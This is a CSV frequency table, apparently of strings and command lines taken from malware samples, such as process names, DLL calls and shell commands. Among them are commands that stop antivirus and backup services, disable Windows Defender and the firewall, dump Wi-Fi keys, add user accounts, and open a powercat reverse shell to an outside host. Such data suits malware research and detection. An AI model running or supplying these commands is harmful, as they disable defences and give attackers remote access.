API,Frequency
kina0146,1
kina0257,1
kina0291,1
kina0323,1
kina0595,1
kina0677,1
kina0698,1
kina1013,1
kina1047,1
kina1217,1
kina1304,1
kina1344,1
kina1377,1
kina1628,1
kina1649,1
kina1912,1
kina2183,1
kina2199,1
kina2220,1
kina2464,1
kina2493,1
kina2710,1
kina2912,1
kina3039,1
kina3378,1
kina3468,1
kina3476,1
kina3486,1
kina3589,1
kina3702,1
kina3734,1
kina3916,1
kina4094,2
kina4144,1
kina4226,1
kina4261,1
kina4274,1
kina4420,1
kina4440,1
kina4471,1
kina4473,1
kina4631,1
kina4643,1
kina4674,1
kina4730,1
kina5053,1
kina5072,1
kina5079,1
kina5172,1
kina5563,1
kina5598,2
kina5620,1
kina5681,1
kina5868,1
kina5880,1
kina5998,1
kina6174,1
kina6415,1
kina6510,1
kina6516,1
kina6518,1
kina6578,1
kina6728,1
kina6824,1
kina6856,1
kina6936,1
kina7118,1
kina7152,1
kina7348,1
kina7586,1
kina7604,1
kina7775,1
kina7884,1
kina8066,1
kina8151,1
kina8160,1
kina8327,1
kina8598,1
kina8605,1
kina8849,1
kina8860,1
kina8906,1
kina8985,1
kina9056,1
kina9160,1
kina9214,1
kina9290,1
kina9559,1
kina9561,1
kina9575,1
kina9613,1
kina9629,1
kina9672,1
kina9772,1
kina9909,1
kino0423,1
kino0442,1
kino0593,1
kino0852,1
kino0885,1
kino1001,1
kino1214,1
kino1254,1
kino1429,1
kino1474,1
kino2009,1
kino2037,1
kino2665,1
kino2889,1
kino3046,1
kino3398,1
kino3445,1
kino3576,1
kino3955,1
kino4085,1
kino4181,1
kino4526,1
kino4569,1
kino4952,1
kino4975,1
kino5724,1
kino5762,1
kino6262,1
kino6354,1
kino6570,1
kino6573,1
kino6589,1
kino6664,1
kino6955,1
kino7292,1
kino7891,1
kino7985,1
kino8181,1
kino8818,1
kino8847,1
kino8991,1
kino9637,1
kiogio,1
kj1xDG9M,1
kjhlb,1
kjsgNqEQtirke,1
kjwsjnjn,1
kkUfsLDbd,1
kkrbfp,1
kkyjozxxezl,1
km300raq,1
kmZZURNlOG2C,1
knowleovl,1
koaOGgZ,1
koqub,1
kos1,1
kp-crndj,1
kp010495,1
kp030412,1
kp061698,1
kp062077,1
kp106722,1
kp159417,1
kp163635,1
kp190581,1
kp224218,1
kp244300,1
kp262871,1
kp272535,1
kp284230,1
kp321909,1
kp401427,1
kp401511,1
kp422776,1
kp425327,1
kp431833,1
kp445602,1
kp451184,1
kp476148,1
kp476381,1
kp504506,1
kp539013,1
kp642246,1
kp646260,1
kp646398,1
kp676394,1
kp763870,1
kp768048,1
kp896842,1
kp911652,1
kp943372,1
kp960665,1
kqkjz214.u02.exe,1
kqtzueqoc,1
kqvxgQQjSVi,1
krakentemp0000,1
ksams,1
ksfByV,1
ksmj.ddns.net.exe,1
kvjsYSfiOIEUNX,1
kx new,1
kxoylkysjvopwynvcwgijctunuaq,1
kyWoUg,1
kzVxGfDWUbAg,1
kzbxduu4,1
kzkfusyxjscbqgazhxjcxlzat,1
kzksEye,1
kzyrliwsvv,1
l0119805,1
l0134621,1
l0165874,1
l0260785,1
l0359330,1
l0573516,1
l05EF99,1
l0920481,1
l0988176,1
l0o23alo,1
l1086342,1
l1263975,1
l1516645,1
l1518989,1
l19uN67,1
l1IRr8npYRL3m1TwDlV7BI8krChTb4,1
l20PU16,1
l2103019,1
l2391294,1
l2559146,1
l2567324,1
l25ud52,1
l2721029,1
l2737317,1
l2828872,1
l28vb08,1
l2961237,1
l3114746,1
l3459085,1
l3493876,1
l3557837,1
l3849040,1
l3915366,1
l3928774,1
l3FcmCQxFyjhSd8BqafE9Y,1
l4030832,1
l4085594,1
l4140776,1
l4182967,1
l4227079,1
l43tE77,1
l44PI27,1
l4896083,1
l4969492,1
l4hsj0xe,1
l50Ps12,1
l5465365,1
l5739068,1
l5947506,1
l6018492,1
l60bY99,1
l6239614,1
l64fQ59,1
l6641498,1
l66bF98,1
l6714760,1
l6925521,1
l6951477,1
l69sQ30,1
l6jMVm4NZrwQ,1
l7010111,1
l7425410,1
l7581182,1
l7677886,1
l7807918,1
l7927719,1
l79TH49,1
l8000531,1
l8012690,1
l8065377,1
l8155926,1
l8196450,1
l8351690,1
l8478978,1
l8504875,1
l86nj46,1
l8782943,1
l87ce48,1
l8929429,1
l8943203,1
l8988051,1
l9064872,1
l91ip55,1
l9270750,1
l9339797,1
l93LX59,1
l93RT56,1
l9429485,1
l9639460,1
l9689747,1
l9736701,1
l9927926,1
lAITkSp,1
lCQWbPNnxfqg,1
lEIbxztPTKpOpY,1
lFsfrR,1
lGLFIsfRGFw,1
lHATJx,1
lHUszyJVfV,1
lHuJ4aKJis,1
lNUAsKQAflDtW,1
lNvKDNftViau7G8MQAMc1EJQaUJNmV,1
lRVLmzeUWW,1
lSYqyGVvtQqrBo,1
lVPsfst,1
lWIjsFSaodbeNj,1
lXykTPO,1
lZyEkPv,1
laNbTqVew,1
laren,1
latest,1
latestX,2
launcher,1
launcherr,2
lblfdvn,1
lbnxj,1
lbpfptv,1
lbplxr,1
lbthxvn,1
lbulx,1
lbvfdr,1
lbxbp,1
lbxrfjr,1
ld8jgbo6,1
ldhpth,1
ldjtj,1
ldjvf,1
ldlxth,1
ldpdhbx,1
ldrlKycSDDnx,1
ldrxttn,1
ldxfdxt,1
legedddd,1
legjong,1
legosa,2
lehcasiXAIyd,1
lenRAncUgDzwq,1
lfflphr,1
lfmtgmvzutfjelppqqysthr,1
lfnvflx,1
lfrfbt,1
lftdlld,1
lfu0FXDqhS,1
lgpllibs,1
lgyodslgys,1
lhANCO,1
lheh2Yi0brFl,1
lhfnnlx,1
lhjtv,1
lhpjlfb,1
lhtvr,1
libEGL,1
libGLESv2,1
liba1742,1
liba1950,1
libcore.io.IoBridge.open,1
lifun,1
lighthouse,1
lil bot,1
linkinfo,1
lipmqsn,1
liwen,1
ljddb,1
ljdlbf,1
ljeywqojdb,1
ljhdt,1
ljlvbfp,1
ljnht,1
ljnlfln,1
lkFZLzY,1
lkyWsisleKqfX,1
lljnlx,1
llnjjh,1
llrlrr,1
lnBqRbz,1
lnKKOgbI,1
lnVxkRbaQiXQZC,1
lnYkIr,1
lnfft,1
load_patcher,1
locales,2
lock,1
logagent,2
logger,1
logonUI,1
lol1,1
lol2,1
lol3,1
lomep,1
longjmp,1
loop,1
lopataminers,1
love,1
lpbxfqbkfwch,1
lphjt,1
lphsi,1
lpjLL7oMJP803Xm,1
lppdv,1
lq3juzqNp,1
lr067852,1
lr069209,1
lr127746,1
lr272276,1
lr289530,1
lr309116,1
lr338978,1
lr341256,1
lr358203,1
lr502483,1
lr535508,1
lr545941,1
lr554215,1
lr612220,1
lr640264,1
lr645277,1
lr658251,1
lr705229,1
lr734739,1
lr787189,1
lr821325,1
lr933020,1
lr942604,1
lr974725,1
lr984010,1
lrdpr,1
lrdvbv,1
lrflxlr,1
lrpbjdf,1
lrtnhx,1
lrttgdApjFek,1
ls1FDZl,1
lsYlVkswxolg,1
lsasm,1
lt7dXuCohO0H27JmMyIP8p4buv,1
ltbjbp,1
ltbltvr,1
ltlnlxd,1
ltndtx,1
ltnjxxx,1
ltttb,1
luNcAmOOoYokS,1
luwA28yh4687,1
luwXXocZNfe,1
lv-LV,2
lvKVziSWfs,1
lvltfx,1
lvtfhpb,1
lvxjhll,1
lvxtGIy,1
lxFRWDm,1
lxbxv,1
lxdbxpx,1
lxdfhjl,1
lxhrn,1
lxpvrt,1
lxrdn,1
lxrtx,1
lxtmqcn,1
lxtnlt,1
lxvjb,1
lyYiqSlfZKKhOe,1
lypdu,1
lz32,1
lzVdqPqKsPrhfz,1
m0127341,1
m0427948,1
m1057323,1
m1975043,1
m2039554,1
m2531373,1
m2603808,1
m3253393,1
m3645928,1
m3728434,1
m4161429,1
m4607779,1
m4881599,1
m52001476,1
m5611577,1
m5723517,1
m6203200,1
m6490488,1
m7137571,1
m7445226,1
m7855484,1
m8201358,1
m8903074,1
m9028032,1
m9770960,1
mAoBkzhRkqPh,1
mBnSJLrCYOxS,1
mBsDKC,1
mCRBfvf,1
mDrpTbpCHU,1
mEYhYQnfzBRh,1
mHCANj,1
mHCVjxfo,1
mHeZtKytHvaAQ,1
mIsRPVu,1
mJIODQFPA,1
mKFpUpwbxX,1
mKSjGvfmIulVB,1
mKxmWFctUQaiY,1
mOW24Ds08,1
mOmIKQT4sgDI4H7M7OD9eTRi9QYa0z5LCNw,1
mPFSsCXVbzPQ,1
mSGGLaJI_crypted,1
mUQabO,1
mUsYIbZfsGwZQG,1
mVAsikIqy,1
mVL42yO92,1
mVnvbKFkPE,1
mXEbSqCYxiB,1
mXOAcVlQZdpwS,1
mYkgEyfKeCdFSXxP5pI1IXdrx4694IQzKqZPlAWBT0iNDHm0,1
mYmyqZcQ,1
mZanCtInfW,1
macholib,1
magnify,1
mahyxlm,1
mail,1
mainclean,1
maintenanceservice,1
maintenanceservice_installer,1
mala,1
malq,1
manifest,2
mapi32.dll.MAPISendMail,2
mapper,1
mapper (2),1
markdownpad32,1
maybelanguage,1
maybellanguage,1
mbhPbnnducaHzJ,1
mbr x32,1
mbr x64,1
mcQOzBfNx,1
mcTvsw,1
mciSendStringW,1
md11_note123,1
mdmyEd,1
medicalanalysis,1
medicallanalysis,1
mercury,1
messages,1
messages2,1
messsi,1
meth,1
mfpip,1
mgeytrljdy,1
mgeztrljdy,1
mghd,2
mgtanCyg,1
mhaqACzcl,1
mheztrljey,1
mhie,1
mi_script,1
mibtXkXdCSfWtk,1
miccrosaft,1
miccrosaft.exe miccrosaft.exe ENABLE,1
micro,1
microsoft,1
microsoft shared,2
microsoft.exe microsoft.exe ENABLE,1
mimikatz,1
min 1,1
min 2,1
min fiQ62iH1,1
miner,1
minidump-analyzer,1
mioirmljvjk,1
misid,1
misids,1
mixerOpen,1
mixtwo,1
miyQzLDjZp,1
miychjo,1
mjWssjb,1
mjnjg,1
mjps630a,1
mjw_ui9u,1
mkecwrpjhb,1
mlAWAtlKYI,1
mlrxtsh,1
mlxsc_sj,1
mmfcddntr,1
mnPZjkmPGLsA,1
mnmkcj,1
mo 5,1
mo 60},1
moHVytnrQwGv,1
moZQETDTgeJcz,1
"mode  65,10",2
"mode  85,25",1
mode  con:cols=100 lines=15,2
modf,2
modules,1
monitor,1
monitorCommon,1
moras,1
mouse_event,1
mouthcoordinate,1
mozavcodec,1
mozavutil,1
mozglue,1
mozilla,1
mpr.dll.WNetAddConnection2A,1
mpr.dll.WNetAddConnection2W,1
mpr.dll.WNetCancelConnection2A,1
mprss,1
mqnjg,1
mr0safkh,1
mrFycCCuCYn,1
msHTa,1
msYPHmdUXWt2ls0BqRd56CbLzyri7,1
ms_tool,2
msadc,1
msay0q,1
msblockwin,1
msbroker,1
msbrowser,1
msbuilds,1
mscomNet,1
mscomProvidernet,1
msconfig.exe.exe -PropertyType String,2
mscontainer,1
mscorsw,1
msen,1
msg  * Enjoy!!,1
msg  * Please Subscribe zenhao lau!!,1
msg  * Youve Been Hacked By zenhao lau Youtuber!!!,1
msgs,1
mshta,1
mshypercontainer,1
msiexec,1
msimages,1
mslwvtts,1
msoia,1
mspaint,2
msscp,1
mssgRpOSZEPHsf,1
mssgn,1
msvcp140,1
msvcrt,1
msvfw32,1
mswsock,1
mtCpSC,1
mtadzIPYdmrk,1
mthgfkfawivclqmtqdrkdee,1
mts104wift,1
mtswift,1
mubeskgb,1
mujqscv,1
muwLGCgfkgI,1
mvhNooGCfvxa,1
mwCRYG,1
mx2842fm,1
mx5018aw,1
mx6044yQ,1
mx6070Vd,1
mx7608nT,1
mx8538Ow,1
mx8896IL,1
mx9228BH,1
mxCuaR,1
my super skibidy sigma loader,1
myDrivers,1
myQbMgAKm,1
mySOgyLJvA,1
mybhtnewfile,1
myhsr,1
mylROGge0S,1
myrudsx,1
myslvnewfile,1
mysoftware,1
myygxvphvn,1
myzdOIR,1
mz7iV68,1
mzQyIlmsY,1
n 300,1
n1195154,1
n15di3,1
n1780242,1
n2423325,1
n2521833,1
n3501052,1
n3662799,1
n3705331,1
n37663132,1
n4011899,1
n4445439,1
n4619318,1
n4738627,1
n4767688,1
n4922043,1
n4923067,1
n5280873,1
n5352215,1
n6793419,1
n6856315,1
n6860900,1
n6974852,1
n7063149,1
n7513547,1
n8189853,1
n8217142,1
n880E6sbFEumx9tx,1
n9201378,1
n9254959,1
n9549561,1
n9752420,1
n9777785,1
n9783012,1
n9EpQbAiAyLU53EUsIEuJF2yzmk,1
nFgREDHmZAkBY,1
nIh80ko,1
nKJB6Zs08weWG,1
nNwgCkzp4Tu,1
nOAiyaZU,1
nPPGTpcTsshCyU,1
nPnCvzJZlSi,1
nPrpvEbRKI,1
nQcsDlzpISjK,1
nQeTEaIn,1
nQvRCv,1
nRGThSlhfFI,1
nSDbtACKzLOAN,1
nTldmXNGY,1
nUIbzjHslTX,1
nUYsKS,1
nXOLUquTz,1
nXUcBcEOyROdbV,1
nXvHPne,1
nY8REtogJqr,1
nZDVsDxUGnpK,1
nZxUcKhx,1
nZxhrTWcGdV,1
naZOFxE,1
nackfei,1
name,1
name.exe.bat,2
namez,1
nano,1
nb-NO,2
nbXLPqxkBDPp,1
nbfxPpaebA,1
nbhdp,1
nbjfrd,1
nbpfdf,1
nbtdxht,1
nbveek,1
nbxnv,1
nc8f8ruu,1
ncOTDDGP1VwOkPEGIop7fQp+0frLlJjYo+97bpGTcqFA3w=,1
nckpnlzy,1
nddddft,1
nddjb,1
ndhbfh,1
ndhpfh,1
ndlhhl,1
ndtdff,1
ndtrjv,1
nearchapter,1
nearchapterpro,1
nearchaptter,1
needdevelloper,1
needdeveloper,1
nelydZeCxJQK,1
nepovezlo,1
net  stop AOTAgentSvc,1
net  stop AcrSch2Svc,1
net  stop AcronisAgent,1
net  stop Apache2,1
net  stop Avast Antivirus!,1
net  stop CobianBackup11,1
net  stop DbxSvc,1
net  stop MSSQL$SQLEXPRESS,1
net  stop MongoDB,1
net  stop MpsSvc,1
net  stop Ntrtscan,1
net  stop OracleServiceXE,1
net  stop OracleXETNSListener,1
net  stop QBCFMontorService,1
net  stop QBVSS,1
net  stop REportServer$ISARS,2
net  stop ReportServer$ISARS,1
net  stop SQLAgent$SQLEXPRESS,1
net  stop TMBMServer,1
net  stop TMResponse,1
net  stop TmWSCSvc,1
net  stop Tmccst,1
net  stop Tmlisten,1
net  stop Trend Micro,1
net  stop Web Service Communicator,1
net  stop WinDefend,1
net  stop bits,1
net  stop cbVSCService11,1
net  stop iVPAgent,1
net  stop security center,1
net  stop sharedaccess,1
net  stop wuauserv,1
net  user,1
net  user a,1
net stop Kingsoft AntiVirus Service,1
net stop VSS & sc config VSS start= disabled,2
net stop mssecsvc2,1
net.exe user a.monaldo helloworld,1
net1  stop AOTAgentSvc,1
net1  stop AcrSch2Svc,1
net1  stop AcronisAgent,1
net1  stop Apache2,1
net1  stop Avast Antivirus!,1
net1  stop CobianBackup11,1
net1  stop DbxSvc,1
net1  stop MSSQL$SQLEXPRESS,1
net1  stop MongoDB,1
net1  stop MpsSvc,1
net1  stop Ntrtscan,1
net1  stop OracleServiceXE,1
net1  stop OracleXETNSListener,1
net1  stop QBCFMontorService,1
net1  stop QBVSS,1
net1  stop REportServer$ISARS,2
net1  stop ReportServer$ISARS,1
net1  stop SQLAgent$SQLEXPRESS,1
net1  stop TMBMServer,1
net1  stop TMResponse,1
net1  stop TmWSCSvc,1
net1  stop Tmccst,1
net1  stop Tmlisten,1
net1  stop Trend Micro,1
net1  stop Web Service Communicator,1
net1  stop WinDefend,1
net1  stop bits,1
net1  stop cbVSCService11,1
net1  stop iVPAgent,1
net1  stop security center,1
net1  stop sharedaccess,1
net1  stop wuauserv,1
net1  user,1
net1  user a,1
net1 DefWatch,1
net1 STOP SharedAccess,1
net1 helpmsg 10,2
net1 helpmsg 2,1
net1 helpmsg 8,2
net1 pause KWC1152,1
net1 stop -n apache24,1
net1 stop Kingsoft AntiVirus Service,1
net1 stop VSS & sc config VSS start= disabled,2
net1 stop mssecsvc2,1
net1 stop mysql57,1
net1 stop srservice,1
net1 stop swprv,1
net1 stop vss,1
net1 user a,1
net1 wrapper,1
netcat,1
netcat.exe netcat.exe ENABLE,1
netdhcp,1
netsh,2
netsh  advfirewall firewall Delete rule name=LetsPRO,1
netsh  advfirewall firewall Delete rule name=LetsVPN,1
netsh  advfirewall firewall Delete rule name=lets,2
netsh  firewall set opmode mode-disable,1
netsh  winsock reset,1
netsh  wlan show profile name=Loaded into process 1988 key=clear,1
netsh  wlan show profile name=Loaded into process 2116 key=clear,1
netsh  wlan show profile name=Loaded into process 2304 key=clear,1
netsh  wlan show profile name=Loaded into process 2376 key=clear,1
netsh  wlan show profile name=Loaded into process 2624 key=clear,1
netsh  wlan show profile name=Loaded into process 3968 key=clear,1
netsh winsock reset,1
new Purchase Order,1
new enable=Yes,2
newbin,1
newfile,1
newnew,1
newss,1
nextspecialist,2
nfImkOjft,1
nfhbjjd,1
nfhdv,1
nflbx,1
nftdr,1
ngwsGjC,1
nh2KC83,1
nhbdlhx,1
nhbrn,1
nhbrnh,1
nheyryryy4u,1
nhjbb,1
nhnblb,1
nhpbpr,1
nhpbvn,1
nhvlnbf,1
nhxbrl,1
nhxltbp,1
ni3kvcog,1
niPCCh,1
niba0114,1
niba0537,1
niba0652,1
niba0656,1
niba0821,1
niba1931,1
niba2214,1
niba3518,1
niba5025,1
niba5313,1
niba5960,1
niba6073,1
niba6299,1
niba6381,1
niba6765,1
niba6805,1
niba6908,1
niba7464,1
niba7679,1
niba8346,1
niba9094,1
niba9792,1
nice0096,1
nice0350,1
nice1108,1
nice5455,1
nice6537,1
nice7992,1
nieYXdFsGNKP,1
nigaysnkfausnhfz,1
nigga,1
niiNFfmYtHiL,1
niychjo,1
njAIVrRnKBION,1
njTHleTxYF,1
njY7530ZT,1
njjxp,1
njv69lC70,1
njvxdvt,1
nl-NL,2
nlbdn,1
nllJKmehpTGztY,1
nlprn,1
nmVPaahGzOKL,1
nnhpr,1
nnlnPVukVYJ,1
nnpxth,1
nnvlr,1
no defender,1
nogpn,1
noise,1
nojhg,1
nologo c,2
nologo m,2
not rat,1
notepad.exe notepad.exe ENABLE,1
notes,1
notice,1
npbdfp,1
npdlddv,1
npdpn,1
npnntfl,1
npp.8.6.2.Installer.x64.exe,1
nppnnpl,1
npyoZBxDJojJkK,1
nqPVilX2zxfswNZ,1
nqhcvd,1
nqnjg,1
nrdldr,1
nrflxx,1
nrfpl,1
nrfwmWOV,1
nrlfhp,1
nrmkerdjc,1
nrntld,1
nrvdff,1
ns0004go,1
ns2338MI,1
ns2730HD,1
ns2749fr,1
ns3773SK,1
ns4979hT,1
ns5251Ks,1
ns5647hy,1
ns6402zP,1
ns8302PS,1
ns9039TQ,1
nslookup  myip.opendns.com resolver1.opendns.com,1
nslookup carder.bit ns1.wowservers.ru,2
nslookup carder.bit ns2.wowservers.ru,2
nslookup ransomware.bit ns1.corp-servers.ru,1
nslookup ransomware.bit ns1.wowservers.ru,2
nslookup ransomware.bit ns2.corp-servers.ru,1
nslookup ransomware.bit ns2.wowservers.ru,2
nslookup zonealarm.bit ns1.corp-servers.ru,1
nslookup zonealarm.bit ns2.corp-servers.ru,1
nsm6E3E,1
nsou,1
nsp5E47,1
nss3,1
nssckbi,1
nswE1E9,2
ntblpdn,1
ntdll.dll.NtDeviceIoControlFile,1
ntdll.dll.NtReadFile,1
ntdll.dll.NtWriteFile,1
ntfpb,1
nthfvhh,1
nthhldb,1
ntlvlb,1
ntnhrbb,1
ntoskrnl,1
ntrdv,1
nttnjjr,1
ntvdbhb,1
null,1
numbers,1
nvapilauncher,1
nvhpltx,1
nvhrxb,1
nvvxb,1
nwM92hp68,1
nxdhfx,1
nxhrd,1
nxlnf,1
nxlnriufactocgzojkoennf,1
nxnph,1
nxpph,1
nxrpb,1
nxtfjfr,1
nxxlbx,1
nyfLtukOoq,1
o0045896,1
o0075689,1
o0095528,1
o0554777,1
o1074667,1
o1305402,1
o1463937,1
o1920558,1
o2539018,1
o2792576,1
o2942176,1
o2soroxi,1
o3104653,1
o3532759,1
o3788793,1
o3907621,1
o4010659,1
o4JpeE0J6E,1
o4YCgrcPxm6nWGgTLNljTukjVfZEoa,1
o5171983,1
o5494401,1
o5561718,1
o5819584,1
o5g1KRBb5tOtbPH6N61vR3ZKR64aoRwqyGkXankmFs2cZprZI,1
o6014188,1
o6111847,1
o6716188,1
o6884578,1
o6wtGNgfG668HaxhzcS8fGA,1
o7236390,1
o7551962,1
o7765524,1
o7851445,1
o7932707,1
o8O71,1
o9471830,1
o9850572,1
o9881879,1
oBHazuTHf,1
oCQYhfRB1EzrP,1
oDsvWZJmBpNs,1
oEWeptTwspfoy,1
oFhQSHBsVAZS,1
oIOQ9UM58mUeSYcJpTQArRK7kYcdPFRvGfeJNsV3vu0gQ,1
oJPvBr,1
oJQHsIjJ,1
oLkqapPJ,1
oNqxPR,1
oOgmJDo,1
oPBPcYPQIsgWF,1
oPL6j2OtN4,1
oPrZgwB,1
oQ4of,1
oRRezBpjkSIS,1
oRfUlcPSkhje,1
oSG0DtwH58jESdPiWbQWqH7Kb5,1
oTXgUAEvCLyR,1
oUKNzQn,1
oUaNDTX,1
oUgLIaeuV,1
oVPIiUV,1
oVRiBA,1
oVneFseV,1
oYhFtKyzllSG,1
obRUfIkARXIyf,1
obhwifs,1
objectindulging,1
objectsandeltrernes,1
occurdesigner,1
ocnbvdevo,1
odSwift,2
odbc32,1
odemeswift,1
odyUZgjE,1
oehrrym,1
offc,2
officework,1
ofqp,1
ohXzSpiCLJRx,1
ohbrnmrswyyeidl,1
ohdahnt,1
oigaysnlfd,1
oijhohrg,1
ojdbvtoidavqnica,1
ojoSAsAixKdZhW,1
okQjwJpvVx,1
okxi,1
olUpuh,1
olXpYqQ,1
oldplayer,1
oldsfsdf,1
ole32.dll.OleLoad,1
oleaut32.dll.OleCreatePropertyFrameIndirect,1
olehpsp,1
olepro32.dll.OleCreateFontIndirect,2
olepro32.dll.OleCreatePictureIndirect,2
olepro32.dll.OleCreatePropertyFrame,2
olepro32.dll.OleLoadPicture,2
olmapi32,1
olrbdwiucqlmwjdrmkpyrmmqdcw,1
olyaua,1
omari,1
omflvSkRESnXQ,1
omni,1
omsecor,1
on6jPp6S,1
on_avast_dll_unload,1
onavsjuo,1
onetap,1
ooVAYW,1
oobbtR,1
oobeldr,1
oopaihvhglijkp,1
opUhagSgTTDsBy,1
opee37,1
opqoo,1
oqiReQQ,1
oregz,1
osclientcerts,1
osgh,1
oshg,1
oskmenu,1
osknumpad,2
oskpred,2
otbpakka,1
ouFPJorC,1
ouUCgDierhsucs,1
ouir,1
ouir.exe ouir.exe ENABLE,1
ouktlder,1
ouleTXgCduhFno,1
ouljqysF,1
oulmkfam,1
oumglyvvd0,1
oumglyvvd1,1
oumglyvvd2,1
oumglyvvd3,1
oumglyvvd4,1
outlook,1
outlook logging,1
ovGGbFXAstmkV,1
ovQRCl,1
ovnhsfisr,1
ovrwtugtua,1
ovuygcqckqnhvxifhoemgrycub,1
owIodkLnYWLcJl,1
owYQdioNkRUQnS,1
owerrinta,1
ox25rtug,1
oxfcxx,1
oyBXVIsLPyI,1
oyQDtii,1
oylomfj,1
oynqboor,1
ozrlzfgaqbxworetablmeumbpfe,1
p0213473,1
p0546243,1
p0710931,1
p0717479,1
p0740502,1
p0755426,1
p0854230,1
p0937356,1
p1464182,1
p3005827,1
p3198836,1
p3332254,1
p3463177,1
p3973735,1
p4148100,1
p4374264,1
p4506378,1
p4617027,1
p4794863,1
p4982569,1
p4index,1
p5118110,1
p5450728,1
p5811629,1
p5943403,1
p6151635,1
p6737955,1
p6bcjnjm,1
p7913494,1
p8634851,1
p8938680,1
p9173619,1
p9233288,1
p9397368,1
p9644550,1
p9794123,1
p9819606,1
pB9D4JgqIW,1
pBIAvksiuGW,1
pCRPCoHGKNRB,1
pEbkeePbTwoQk,1
pEiJZszBZRr,1
pFKIY4EPZg,1
pFmRTXq,1
pGILZb,1
pGnxfTwNhIldl,1
pHaVcqxlQeUS,1
pHfcZIrosVJt,1
pHwprVChSsj,1
pIISnFJ,1
pIfhEVZxImUgL,1
pJITYDssoONW,1
pKffigaoiijF,1
pLRgJtKUXyYos,1
pLmoymolgcyq,1
pNNgGk,1
pNxfkcIadj,1
pOWeRsHeLL,1
pQGevTeWmqaRiB,1
pRpOxaisjLkP,1
pTjKCpBCEnyBUb,1
pXjXtQrvmCyB,1
pXoAsbkQ,1
pYFXaTgYnO,1
pango,1
paoma,1
parrot crack cs go,1
parrot crack cs go.exe parrot crack cs go.exe ENABLE,1
pass,1
passive,1
path,2
pau59wq98,1
paymentscreenshot,1
pbJPkFtgaYs,1
pbbjv,1
pbhfdrn,1
pbhld,1
pbhnh,1
pbhtj,1
pbjcw,1
pbjjvnt,1
pbprj,1
pbqikHZnsBubAR,1
pbrhp,1
pbrpb,1
pbvpvft,1
pcx5bgjg,1
pdfhrdb,1
pdllnl,1
pdnlbr,1
pdpjbd,1
pdrhntx,1
pdrnh,1
pdrsoSGJcEcRG,1
pdthn,1
pdtjhj,1
pdvpb,1
peascol,1
pendiente,1
pensionsbidrags,1
pfjtxjp,1
pfrtpxt,1
pgeask,1
ph1ea59,1
phdbvx,1
phjp3ebm,1
phnjp,1
phone,1
phoneupdate,1
photoviewer,1
phxxbtr,1
pi_brokers,1
pickme,1
pid 1128,1
pid 1712,1
pid 1916,1
pid 2092,1
pid 2100,1
pid 2552,1
pid 2616,1
pid 2684,1
pid 2876,1
pid 3732,1
pile,1
pilgm,1
ping  -4 -n 1 WORKSTAT08,1
ping  -n 1 127.0.0.1,2
ping  -n 3 127,2
ping  -n 60 127,1
ping  1.1.1.1 -n 1 -w 1000,1
ping  1.1.1.1 -n 1 -w 3000,1
ping  1.1.1.1 -n 5 -w 5000,1
ping  127,1
ping  127.0.0.1 -n 100,1
ping  127.0.0.1 -n 14,1
ping  127.0.0.1 -n 15,1
ping  127.0.0.1 -n 17,1
ping  127.0.0.1 -n 18,1
ping  127.0.0.1 -n 20,1
ping  127.0.0.1 -n 21,2
ping  127.0.0.1 -n 22,1
ping  127.0.0.1 -n 26,1
ping  127.0.0.1 -n 29,1
ping  127.0.0.1 -n 30,1
ping  127.0.0.1 -n 31,1
ping  127.0.0.1 -n 4,1
ping  127.0.0.1 -n 40,2
ping  127.0.0.1 -n 43,1
ping  127.0.0.1 -n 44,1
ping  127.0.0.1 -n 45,1
ping  127.0.0.1 -n 9,2
ping  8.8.8.8 -n 2,1
ping  8.8.8.8 -n 3,1
ping baidu,1
ping.exe -n 1 -w 1000 www.ccleaner.com,1
pingsender,1
pip-ephem-wheel-cache-7pu0vs,1
pip-install-tc1eqp,1
pip-req-tracker-1_8svb,2
piujnxxwmy,1
pj1Ok21,1
pjbpdp,1
pjbptln,1
pjcuOTy,1
pjdvfr,1
pjhhpv,1
pjioq,1
pjjvnfb,1
pjplbxh,1
pjplvv,1
pjtln,1
pksuDlslcW,1
pku78Jv19,1
pkz69aX54,1
pl-PL,2
pl6Cn5baif,1
platform,1
plbtxb,1
pldpd,1
pllnb,1
pltth,1
plug_ins,1
plug_ins3d,1
plugin-container,1
plugin-container.exe.sig,1
plugin-hang-ui,1
plxfdb,1
pmMvwz3lY7qlA,1
pmhycF2ie9fH,1
pnbnb,1
pndld,1
pndpp,1
pnhjhxh,1
pnllttn,1
pno8psxr,1
pnpjlj,1
pnrnf,1
pop3,1
portcomponentcrt,1
power.ps1); powercat -c fbi.fund -p 443 -e cmd,1
"powershell  -Command Add-MpPreference -ExclusionExtension @(exe,dll) -Force",2
powershell  -Command Set-MpPreference -DisableRealtimeMonitoring $true,2
